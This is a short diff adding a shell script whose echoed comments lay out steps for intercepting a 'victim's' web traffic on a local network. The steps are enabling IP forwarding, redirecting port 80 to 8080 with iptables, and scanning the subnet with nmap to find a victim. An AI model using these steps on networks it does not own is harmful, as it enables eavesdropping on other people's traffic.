@@ -1,0 +1,8 @@
+echo "echo 1 > /proc/sys/net/ipv4/ip_forward, # This command needs to su first to enable IP-forwarding function in my Linux. Victim will lose connectivity if no this command."
+
+echo "# Following is a redirect command, 80->8080"
+# "sudo iptables -t nat -L" to list up all rules in table nat
+# Following command make all traffic to my 80 port go to my 8080 port (port under 1024 needs root privilege)
+echo "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+
+echo "nmap 192.168.1.2-254 -vv -O, to scan for a victim; skip this if you know victim's IP"
